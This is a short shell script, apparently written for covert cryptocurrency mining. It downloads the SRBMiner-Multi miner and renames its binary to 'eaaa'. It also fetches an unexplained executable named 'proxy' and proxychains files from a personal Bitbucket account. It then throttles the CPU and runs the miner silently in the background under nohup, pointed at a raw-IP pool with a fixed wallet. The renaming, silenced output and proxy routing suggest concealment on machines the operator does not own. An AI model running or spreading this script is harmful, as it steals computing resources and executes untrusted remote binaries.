sudo apt update ; sudo apt install cpulimit htop neofetch -y
wget -O hamz.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.1/SRBMiner-Multi-2-3-1-Linux.tar.xz && tar -xf hamz.tar.gz
wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(curl ifconfig.me)
cd SRBMiner-Multi-2-3-1/
mv SRBMiner-MULTI  ..
cd ..
mv SRBMiner-MULTI eaaa
rm -rf SRBMiner-Multi-2-3-1/
sudo cpulimit --background -e eaaa -l 700
nohup ./eaaa --algorithm yespoweric --pool stratum+ssl://103.249.70.7:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 8 --disable-gpu &> /dev/null &
